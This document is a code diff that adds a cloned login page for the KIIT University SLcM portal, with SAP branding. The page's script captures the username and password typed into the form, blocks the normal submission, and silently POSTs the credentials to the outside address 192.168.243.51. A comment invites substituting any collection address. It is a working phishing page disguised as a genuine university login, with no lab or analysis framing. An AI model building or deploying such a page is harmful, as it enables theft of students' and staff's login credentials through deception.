@@ -1,0 +1,248 @@
+<html>
+  <head>
+    <link rel="stylesheet" href="KIITSAP_files/nn7.css" />
+
+    <script type="text/javascript">
+    </script>
+    <title>KIIT UNIVERSITY SLcM Portal</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="STYLESHEET" href="KIITSAP_files/nn7_002.css" type="text/css" />
+  </head>
+  <body class="prtlBody urFontBaseFam urScrl">
+
+    <link rel="stylesheet" href="KIITSAP_files/ur_nn6.css" />
+    <script>
+
+      function submitForm() {
+        var form = document.getElementById("certLogonForm");
+        var username = form.j_username.value;
+        var password = form.j_password.value;
+        console.log(username, password);
+        // form.submit();
+
+
+        var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://192.168.243.51", true); // Replace "http://example.com/random" with your random HTTP address
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    // xhr.onreadystatechange = function () {
+    //   if (xhr.readyState === XMLHttpRequest.DONE) {
+    //     if (xhr.status === 200) {
+    //       console.log("Request successful"); // Log success
+    //     } else {
+    //       console.error("Request failed"); // Log error
+    //     }
+    //   }
+    // };
+    xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
+
+    // Prevent default form submission
+    return false;
+
+
+      }
+    </script>
+
+      <table
+        id="tblFrmUI"
+        valign="middle"
+        dir="ltr"
+        style="background-color: #ffffff; margin-top: 50px"
+        width="790px"
+        cellspacing="0"
+        cellpadding="0"
+        align="center"
+      >
+        <tbody>
+          <tr>
+            <td>
+              <img src="KIITSAP_files/lf_tl.png" width="29" height="32" />
+            </td>
+            <td background="KIITSAP_files/lf_st.png"></td>
+            <td>
+              <img src="KIITSAP_files/lf_tr.png" width="27" height="32" />
+            </td>
+          </tr>
+
+          <tr>
+            <td background="KIITSAP_files/lf_sl.png"></td>
+
+            <td width="100%">
+              <table id="tblInnerCnt" dir="ltr" cellspacing="0" cellpadding="0">
+                <tbody>
+                  <tr>
+                    <td valign="top">
+                      <div class="urBrandImage">
+                        <img
+                          src="KIITSAP_files/branding-image.jpg"
+                          alt="Branding Image"
+                          border="0"
+                        />
+                      </div>
+                    </td>
+                    <td width="100%"></td>
+                    <td>
+                      <table height="360px" cellspacing="0" cellpadding="0">
+                        <tbody>
+                          <tr>
+                            <td valign="top">
+                              <div class="urProductName">
+                                <img
+                                  src="KIITSAP_files/pcd!3aportal_content!2fkiit.ac.in.gif"
+                                  alt=""
+                                  border="0"
+                                />
+                              </div>
+                            </td>
+                          </tr>
+                          <tr>
+                            <td valign="top" align="left">
+                              <div class="urLogonData">
+                                <!-- data table starts after this line -->
+                                <form
+                                  autocomplete="off"
+                                  id="certLogonForm"
+                                  name="certLogonForm"
+                                  action=""
+                                  onsubmit="return false;"
+                                >
+
+                                  <table
+                                    class="urLogonTable"
+                                    valign="top"
+                                    cellspacing="3px"
+                                    cellpadding="0"
+                                  >
+                                    <tbody>
+                                      <tr>
+                                        <td colspan="3">
+                                          <div class="urMessageArea">
+                                            <!--	Federation Error Message				-->
+                                          </div>
+                                        </td>
+                                      </tr>
+
+                                      <!-- dysplay link for cert logon -->
+
+                                      <!-- userid -->
+                                      <tr>
+                                        <td>
+                                          <label class="urLblStdNew"
+                                            ><nobr
+                                              >User<span class="urLblReq"
+                                                >&nbsp;*</span
+                                              ></nobr
+                                            ></label
+                                          >
+                                        </td>
+                                        <td>
+                                          <input
+                                            type="text"
+                                            id="logonuidfield"
+                                            name="j_username"
+                                            title="User *"
+                                            class="urEdfTxtEnbl"
+                                            style="width: 170px"
+                                          />
+                                        </td>
+                                        <td width="100%">&nbsp;</td>
+                                      </tr>
+                                      <!-- password -->
+                                      <tr>
+                                        <td>
+                                          <label
+                                            class="urLblStdNew"
+                                            for="logonpassfield"
+                                            ><nobr
+                                              >Password<span class="urLblReq"
+                                                >&nbsp;*</span
+                                              ></nobr
+                                            ></label
+                                          >
+                                        </td>
+                                        <td>
+                                          <input
+                                            type="password"
+                                            id="logonpassfield"
+                                            name="j_password"
+                                            class="urEdfTxtEnbl"
+                                            style="width: 170px"
+                                          />
+                                        </td>
+                                        <td>&nbsp;</td>
+                                      </tr>
+
+                                      <!-- dysplay checkbox for cert-to-user confirmation, after successful logon -->
+
+                                      <!-- create certificate -->
+
+                                      <!-- Federate User checkbox -->
+
+                                      <tr>
+                                        <td colspan="3" width="100%">&nbsp;</td>
+                                      </tr>
+
+                                      <tr>
+                                        <td>&nbsp;</td>
+                                        <td align="right">
+                                          <!-- logon button -->
+                                          <button class="urBtnStdNew" onclick={submitForm()}>Log On</button>
+                                        </td>
+
+                                        <td>&nbsp;</td>
+                                      </tr>
+                                      <!-- logon help -->
+                                    </tbody>
+                                  </table>
+                                </form>
+
+                                <!-- data table ends before this line -->
+                              </div>
+                            </td>
+                          </tr>
+                          <tr>
+                            <td valign="bottom">
+                              <div class="urCopyrightFrame">
+                                <div class="urCopyrightText">
+                                  Copyright © SAP AG. All Rights Reserved.
+                                </div>
+                                <div class="urCopyrightImage">
+                                  <img
+                                    src="KIITSAP_files/sap_logo.png"
+                                    alt="SAP AG"
+                                    title="SAP AG"
+                                    width="55"
+                                    height="27"
+                                  />
+                                </div>
+                              </div>
+                            </td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </td>
+
+            <td background="KIITSAP_files/lf_sr.png"></td>
+          </tr>
+
+          <tr>
+            <td>
+              <img src="KIITSAP_files/lf_bl.png" width="29" height="32" />
+            </td>
+            <td background="KIITSAP_files/lf_sb.png" align="center">
+              <span class="clip"
+                ><img src="KIITSAP_files/lf_clip.png" width="298" height="32"
+              /></span>
+            </td>
+            <td>
+              <img src="KIITSAP_files/lf_br.png" width="27" height="32" />
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </span>
+  </body>
+</html>
